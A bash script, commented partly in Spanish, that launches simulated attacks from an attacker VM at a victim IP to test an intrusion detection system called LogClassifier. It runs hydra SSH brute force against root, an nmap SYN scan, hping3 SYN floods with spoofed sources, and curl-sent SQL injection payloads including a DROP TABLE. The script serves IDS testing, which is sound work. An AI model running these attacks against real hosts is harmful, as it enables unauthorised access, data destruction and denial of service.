#!/bin/bash
# Attack simulation script for LogClassifier IDS testing
# Run from the ATTACKER VM against the VICTIM VM
# Usage: bash attacks.sh <VICTIM_IP>

VICTIM_IP="${1:-192.168.1.100}"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

if [ "$1" == "" ]; then
    echo -e "${YELLOW}Usage: bash attacks.sh <VICTIM_IP>${NC}"
    echo -e "${YELLOW}Example: bash attacks.sh 192.168.1.100${NC}"
    exit 1
fi

echo -e "${RED}=== LogClassifier IDS - Attack Simulation ===${NC}"
echo -e "${YELLOW}Target: $VICTIM_IP${NC}"
echo ""

# --- SSH Brute Force ---
run_ssh_bruteforce() {
    echo -e "${RED}[ATTACK 1] SSH Brute Force → esperado: BLOQUEO ALTA${NC}"
    echo "  Herramienta: hydra | Intentos: 20 passwords"
    if command -v hydra &>/dev/null; then
        hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt \
              -t 4 -f ssh://$VICTIM_IP 2>/dev/null | tail -3
    else
        # Fallback: manual SSH attempts
        for i in {1..20}; do
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
                -o PasswordAuthentication=yes root@$VICTIM_IP 2>/dev/null || true
        done
    fi
    echo ""
}

# --- Port Scan ---
run_port_scan() {
    echo -e "${RED}[ATTACK 2] Port Scan (SYN) → esperado: ALERTA MEDIA${NC}"
    echo "  Herramienta: nmap -sS"
    if command -v nmap &>/dev/null; then
        nmap -sS -T4 --top-ports 1000 $VICTIM_IP -oN /dev/null 2>/dev/null | tail -3
    else
        echo "  nmap no encontrado. Instala: apt install nmap"
    fi
    echo ""
}

# --- HTTP Flood ---
run_http_flood() {
    echo -e "${RED}[ATTACK 3] HTTP Flood → esperado: REGISTRO BAJA${NC}"
    echo "  Herramienta: hping3 / curl flood"
    if command -v hping3 &>/dev/null; then
        timeout 5 hping3 -S --flood -V -p 80 $VICTIM_IP 2>/dev/null || true
    else
        # Fallback: curl loop
        for i in {1..50}; do
            curl -s --max-time 1 http://$VICTIM_IP/ &>/dev/null || true
        done
    fi
    echo ""
}

# --- DDoS simulado ---
run_ddos() {
    echo -e "${RED}[ATTACK 4] DDoS Simulation → esperado: BLOQUEO CRITICA${NC}"
    echo "  Herramienta: hping3 SYN flood intensivo"
    if command -v hping3 &>/dev/null; then
        timeout 8 hping3 -S --flood -V --rand-source -p 80 $VICTIM_IP 2>/dev/null || true
    else
        echo "  hping3 no encontrado. Instala: apt install hping3"
    fi
    echo ""
}

# --- SQL Injection (web) ---
run_sqli() {
    echo -e "${RED}[ATTACK 5] SQL Injection probe → esperado: ALERTA ALTA${NC}"
    echo "  Herramienta: curl con payloads SQLi"
    for payload in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3--" "1; DROP TABLE users--"; do
        curl -s --max-time 2 \
             "http://$VICTIM_IP/login?user=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" \
             &>/dev/null || true
    done
    echo ""
}

echo "Selecciona qué ataques lanzar:"
echo "  1) SSH Brute Force"
echo "  2) Port Scan"
echo "  3) HTTP Flood"
echo "  4) DDoS Simulation"
echo "  5) SQL Injection"
echo "  a) Todos en secuencia"
echo ""
read -rp "Opción [1-5/a]: " choice

case "$choice" in
    1) run_ssh_bruteforce ;;
    2) run_port_scan ;;
    3) run_http_flood ;;
    4) run_ddos ;;
    5) run_sqli ;;
    a)
        run_ssh_bruteforce
        sleep 2
        run_port_scan
        sleep 2
        run_http_flood
        sleep 2
        run_ddos
        sleep 2
        run_sqli
        ;;
    *) echo "Opción no válida" ;;
esac

echo -e "${GREEN}=== Ataques completados. Revisa el dashboard. ===${NC}"
